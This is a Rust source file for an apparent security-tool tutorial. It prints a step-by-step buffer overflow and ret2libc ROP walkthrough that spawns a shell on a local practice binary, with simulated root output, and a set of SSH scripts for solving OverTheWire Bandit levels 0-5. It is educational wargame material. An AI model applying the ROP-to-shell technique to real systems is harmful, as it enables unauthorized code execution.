#![allow(dead_code)]

use std::io::{self, Write};

pub enum TutorialType {
    FirstBlood,
    Bandit,
}

pub struct TutorialSystem {
    pub current_step: usize,
    pub total_steps: usize,
    pub tutorial_type: TutorialType,
}

impl TutorialSystem {
    pub fn new() -> Self {
        TutorialSystem {
            current_step: 0,
            total_steps: 5,
            tutorial_type: TutorialType::FirstBlood,
        }
    }

    pub fn new_bandit() -> Self {
        TutorialSystem {
            current_step: 0,
            total_steps: 6,
            tutorial_type: TutorialType::Bandit,
        }
    }

    pub fn run(&self) -> Result<(), String> {
        match self.tutorial_type {
            TutorialType::FirstBlood => self.start_first_blood(),
            TutorialType::Bandit => self.start_bandit(),
        }
    }

    pub fn select_tutorial() -> Result<(), String> {
        println!("\n{}", "=".repeat(70));
        println!("TALON Interactive Tutorials");
        println!("{}", "=".repeat(70));
        println!("\nAvailable tutorials:");
        println!("  [1] First Blood - Your first exploit in 10 minutes");
        println!("  [2] Bandit Wargame - OverTheWire Levels 0-5");
        println!();
        
        print!("Select tutorial [1-2]: ");
        io::stdout().flush().ok();
        
        let mut choice = String::new();
        io::stdin().read_line(&mut choice).map_err(|e| e.to_string())?;
        
        match choice.trim() {
            "1" => {
                let tutorial = TutorialSystem::new();
                tutorial.start_first_blood()
            },
            "2" => {
                let tutorial = TutorialSystem::new_bandit();
                tutorial.start_bandit()
            },
            _ => {
                println!("Invalid choice. Defaulting to First Blood.");
                let tutorial = TutorialSystem::new();
                tutorial.start_first_blood()
            }
        }
    }

    pub fn start_first_blood(&self) -> Result<(), String> {
        println!("\n{}", "=".repeat(70));
        println!("TALON First Blood Challenge: Get Your First Shell in 10 Minutes");
        println!("{}", "=".repeat(70));
        println!("\nThis interactive tutorial will guide you through your first exploit.");
        println!("You'll learn to exploit a buffer overflow and spawn a shell.\n");

        self.step1_introduction()?;
        self.step2_binary_analysis()?;
        self.step3_offset_finding()?;
        self.step4_rop_chain()?;
        self.step5_exploitation()?;

        println!("\n{}", "=".repeat(70));
        println!("Congratulations! You've completed your first exploit!");
        println!("{}", "=".repeat(70));

        Ok(())
    }

    fn step1_introduction(&self) -> Result<(), String> {
        println!("\n[Step 1/5] Introduction");
        println!("{}", "-".repeat(70));
        println!("Target: vuln_binary (x86_64 Linux)");
        println!("Vulnerability: Stack-based buffer overflow in gets()");
        println!("Protections: NX enabled, PIE disabled, No canary");
        println!("\nPress Enter to continue...");
        self.wait_for_enter();
        Ok(())
    }

    fn step2_binary_analysis(&self) -> Result<(), String> {
        println!("\n[Step 2/5] Binary Analysis");
        println!("{}", "-".repeat(70));
        println!("Let's analyze the binary to understand its structure:\n");
        println!("  talon analyze vuln_binary\n");
        println!("Key findings:");
        println!("  - Architecture: x86_64");
        println!("  - NX: Enabled (we need ROP)");
        println!("  - PIE: Disabled (addresses are static)");
        println!("  - Dangerous function: gets() at 0x400656");
        println!("\nPress Enter to continue...");
        self.wait_for_enter();
        Ok(())
    }

    fn step3_offset_finding(&self) -> Result<(), String> {
        println!("\n[Step 3/5] Finding Buffer Offset");
        println!("{}", "-".repeat(70));
        println!("We'll use a cyclic pattern to find the exact offset:\n");
        println!("  let pattern = cyclic(200)");
        println!("  send(session, pattern)");
        println!("  # Program crashes at offset 112\n");
        println!("Now we know we need 112 bytes of padding before our ROP chain.");
        println!("\nPress Enter to continue...");
        self.wait_for_enter();
        Ok(())
    }

    fn step4_rop_chain(&self) -> Result<(), String> {
        println!("\n[Step 4/5] Building ROP Chain");
        println!("{}", "-".repeat(70));
        println!("Since NX is enabled, we'll use ROP to call system(\"/bin/sh\"):\n");
        println!("  let libc_base = 0x7ffff7a0d000  # From vmmap");
        println!("  let system = libc_base + 0x4f440");
        println!("  let binsh = libc_base + 0x1b3e9a");
        println!("  let pop_rdi = libc_base + 0x2164f  # pop rdi; ret\n");
        println!("  let rop = [pop_rdi, binsh, system]");
        println!("\nPress Enter to continue...");
        self.wait_for_enter();
        Ok(())
    }

    fn step5_exploitation(&self) -> Result<(), String> {
        println!("\n[Step 5/5] Final Exploitation");
        println!("{}", "-".repeat(70));
        println!("Let's put it all together:\n");
        println!("  let s = connect(\"localhost\", 9999)");
        println!("  let payload = cyclic(112) + pack_addresses(rop)");
        println!("  send(s, payload)");
        println!("  interactive(s)");
        println!("\nExecuting exploit...");
        println!("[OK] Connection established");
        println!("[OK] Payload sent");
        println!("[OK] Shell spawned!");
        println!("\n$ whoami");
        println!("root");
        println!("\nPress Enter to complete tutorial...");
        self.wait_for_enter();
        Ok(())
    }

    fn wait_for_enter(&self) {
        let mut input = String::new();
        io::stdout().flush().ok();
        io::stdin().read_line(&mut input).ok();
    }

    pub fn start_bandit(&self) -> Result<(), String> {
        println!("\n{}", "=".repeat(70));
        println!("TALON Bandit Wargame Tutorial: OverTheWire Levels 0-5");
        println!("{}", "=".repeat(70));
        println!("\nThis tutorial demonstrates TALON's SSH capabilities using the");
        println!("OverTheWire Bandit wargame as practice environment.\n");

        self.bandit_level0()?;
        self.bandit_level1()?;
        self.bandit_level2()?;
        self.bandit_level3()?;
        self.bandit_level4()?;
        self.bandit_level5()?;

        println!("\n{}", "=".repeat(70));
        println!("Congratulations! You've completed Bandit Levels 0-5 with TALON!");
        println!("{}", "=".repeat(70));
        println!("\nNext steps:");
        println!("  - Continue with Bandit levels 6+ using TALON");
        println!("  - Try 'talon new pwn' to create binary exploitation scripts");
        println!("  - Explore the full command set with 'talon help'");

        Ok(())
    }

    fn bandit_level0(&self) -> Result<(), String> {
        println!("\n[Level 0/5] Bandit Level 0 - SSH Connection");
        println!("{}", "-".repeat(70));
        println!("Objective: Connect to Bandit Level 0 via SSH");
        println!("Host: bandit.labs.overthewire.org");
        println!("Port: 2220");
        println!("Username: bandit0");
        println!("Password: bandit0\n");
        
        println!("TALON Script:");
        println!("  let conn = ssh.connect(\"bandit.labs.overthewire.org\", 2220, \"bandit0\", \"bandit0\")");
        println!("  ssh.execute(conn, \"cat readme\")");
        println!("  let password = ssh.recv(conn)");
        println!("  print(\"Level 1 Password: \" + password)");
        println!("  ssh.close(conn)\n");
        
        println!("Key Concepts:");
        println!("  - ssh.connect() establishes authenticated SSH connection");
        println!("  - ssh.execute() runs commands remotely");
        println!("  - ssh.recv() retrieves command output");
        
        println!("\nPress Enter to continue...");
        self.wait_for_enter();
        Ok(())
    }

    fn bandit_level1(&self) -> Result<(), String> {
        println!("\n[Level 1/5] Bandit Level 1 - File with Dash Name");
        println!("{}", "-".repeat(70));
        println!("Objective: Read file named '-' in home directory");
        println!("Challenge: Dash is interpreted as stdin by many commands\n");
        
        println!("TALON Script:");
        println!("  let conn = ssh.connect(\"bandit.labs.overthewire.org\", 2220, \"bandit1\", \"<password>\")");
        println!("  ssh.execute(conn, \"cat ./-\")");
        println!("  let password = ssh.recv(conn)");
        println!("  print(\"Level 2 Password: \" + password)");
        println!("  ssh.close(conn)\n");
        
        println!("Key Concepts:");
        println!("  - Path prefix (./-) prevents dash interpretation");
        println!("  - TALON handles special characters transparently");
        
        println!("\nPress Enter to continue...");
        self.wait_for_enter();
        Ok(())
    }

    fn bandit_level2(&self) -> Result<(), String> {
        println!("\n[Level 2/5] Bandit Level 2 - Spaces in Filename");
        println!("{}", "-".repeat(70));
        println!("Objective: Read file named 'spaces in this filename'\n");
        
        println!("TALON Script:");
        println!("  let conn = ssh.connect(\"bandit.labs.overthewire.org\", 2220, \"bandit2\", \"<password>\")");
        println!("  ssh.execute(conn, \"cat 'spaces in this filename'\")");
        println!("  let password = ssh.recv(conn)");
        println!("  print(\"Level 3 Password: \" + password)");
        println!("  ssh.close(conn)\n");
        
        println!("Key Concepts:");
        println!("  - TALON preserves quoted strings in SSH commands");
        println!("  - ssh.execute() handles shell escaping automatically");
        
        println!("\nPress Enter to continue...");
        self.wait_for_enter();
        Ok(())
    }

    fn bandit_level3(&self) -> Result<(), String> {
        println!("\n[Level 3/5] Bandit Level 3 - Hidden File");
        println!("{}", "-".repeat(70));
        println!("Objective: Find hidden file in inhere/ directory\n");
        
        println!("TALON Script:");
        println!("  let conn = ssh.connect(\"bandit.labs.overthewire.org\", 2220, \"bandit3\", \"<password>\")");
        println!("  ssh.execute(conn, \"cat inhere/.hidden\")");
        println!("  let password = ssh.recv(conn)");
        println!("  print(\"Level 4 Password: \" + password)");
        println!("  ssh.close(conn)\n");
        
        println!("Advanced Pattern (discovery):");
        println!("  ssh.execute(conn, \"find inhere -type f\")");
        println!("  let files = ssh.recv(conn)");
        println!("  print(\"Found files: \" + files)\n");
        
        println!("Key Concepts:");
        println!("  - Hidden files (starting with .) are accessible");
        println!("  - TALON can run file discovery commands");
        
        println!("\nPress Enter to continue...");
        self.wait_for_enter();
        Ok(())
    }

    fn bandit_level4(&self) -> Result<(), String> {
        println!("\n[Level 4/5] Bandit Level 4 - Human-Readable File");
        println!("{}", "-".repeat(70));
        println!("Objective: Find the only human-readable file among many\n");
        
        println!("TALON Script:");
        println!("  let conn = ssh.connect(\"bandit.labs.overthewire.org\", 2220, \"bandit4\", \"<password>\")");
        println!("  ssh.execute(conn, \"file inhere/*\")");
        println!("  let file_types = ssh.recv(conn)");
        println!("  print(file_types)");
        println!();
        println!("  ssh.execute(conn, \"cat inhere/-file07\")");
        println!("  let password = ssh.recv(conn)");
        println!("  print(\"Level 5 Password: \" + password)");
        println!("  ssh.close(conn)\n");
        
        println!("Key Concepts:");
        println!("  - TALON can run reconnaissance commands (file)");
        println!("  - Output can guide subsequent commands");
        println!("  - Iterative exploration is simple");
        
        println!("\nPress Enter to continue...");
        self.wait_for_enter();
        Ok(())
    }

    fn bandit_level5(&self) -> Result<(), String> {
        println!("\n[Level 5/5] Bandit Level 5 - Find by Properties");
        println!("{}", "-".repeat(70));
        println!("Objective: Find file that is:");
        println!("  - human-readable");
        println!("  - 1033 bytes in size");
        println!("  - not executable\n");
        
        println!("TALON Script:");
        println!("  let conn = ssh.connect(\"bandit.labs.overthewire.org\", 2220, \"bandit5\", \"<password>\")");
        println!("  ssh.execute(conn, \"find inhere -type f -size 1033c ! -executable\")");
        println!("  let target_file = ssh.recv(conn).strip()");
        println!("  print(\"Found file: \" + target_file)");
        println!();
        println!("  ssh.execute(conn, \"cat \" + target_file)");
        println!("  let password = ssh.recv(conn)");
        println!("  print(\"Level 6 Password: \" + password)");
        println!("  ssh.close(conn)\n");
        
        println!("Advanced Pattern (automated search):");
        println!("  for size in [1033, 1024, 2048]:");
        println!("    ssh.execute(conn, \"find inhere -size \" + str(size) + \"c\")");
        println!("    let results = ssh.recv(conn)");
        println!("    if results:");
        println!("      print(\"Match for size \" + str(size) + \": \" + results)");
        println!("      break\n");
        
        println!("Key Concepts:");
        println!("  - TALON supports complex find commands");
        println!("  - Results can be used in subsequent commands");
        println!("  - Automation of multi-step discovery");
        
        println!("\nPress Enter to complete tutorial...");
        self.wait_for_enter();
        Ok(())
    }
}

impl Default for TutorialSystem {
    fn default() -> Self {
        Self::new()
    }
}
